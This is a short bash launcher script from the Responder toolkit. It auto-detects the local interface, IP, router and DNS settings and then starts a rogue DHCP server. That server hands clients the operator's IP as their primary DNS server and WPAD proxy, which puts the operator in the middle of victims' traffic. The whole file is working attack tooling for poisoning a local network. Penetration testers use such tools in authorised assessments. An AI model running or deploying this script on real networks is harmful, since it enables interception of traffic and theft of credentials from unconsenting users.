#!/bin/bash
# This file is part of Responder
# Original work by Laurent Gaffie - Trustwave Holdings
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

# This script will try to auto-detect network parameters
# to run the rogue DHCP server, to inject only your IP
# address as the primary DNS server and WPAD server and
# leave everything else normal.

if [ -z $1 ]; then
	echo "usage: $0 <interface>"
	exit
fi

if [ $EUID -ne 0 ]; then
	echo "Must be run as root."
	exit
fi

if [ ! -d "/sys/class/net/$1" ]; then
	echo "Interface does not exist."
	exit
fi

INTF=$1
IPADDR=`/sbin/ifconfig $INTF | grep 'inet addr' | tr ':' ' ' | awk '{print $3}'`
NETMASK=`/sbin/ifconfig $INTF | grep 'inet addr' | tr ':' ' ' | awk '{print $7}'`
DOMAIN=`grep -E "^domain |^search " /etc/resolv.conf | sort | head -1 | awk '{print $2}'`
DNS1=$IPADDR
DNS2=`grep ^nameserver /etc/resolv.conf | head -1 | awk '{print $2}'`
ROUTER=`/sbin/route -n | grep ^0.0.0.0 | awk '{print $2}'`
WPADSTR="http://$IPADDR/wpad.dat"
if [ -z "$DOMAIN" ]; then
	DOMAIN="  "
fi

echo "Running with parameters:"
echo "INTERFACE: $INTF"
echo "IP ADDR: $IPADDR"
echo "NETMAST: $NETMASK"
echo "ROUTER IP: $ROUTER"
echo "DNS1 IP: $DNS1"
echo "DNS2 IP: $DNS2"
echo "WPAD: $WPADSTR"
echo ""


echo python DHCP.py -I $INTF -r $ROUTER -p $DNS1 -s $DNS2 -n $NETMASK -d \"$DOMAIN\" -w \"$WPADSTR\"
python DHCP.py -I $INTF -r $ROUTER -p $DNS1 -s $DNS2 -n $NETMASK -d \"$DOMAIN\" -w \"$WPADSTR\"
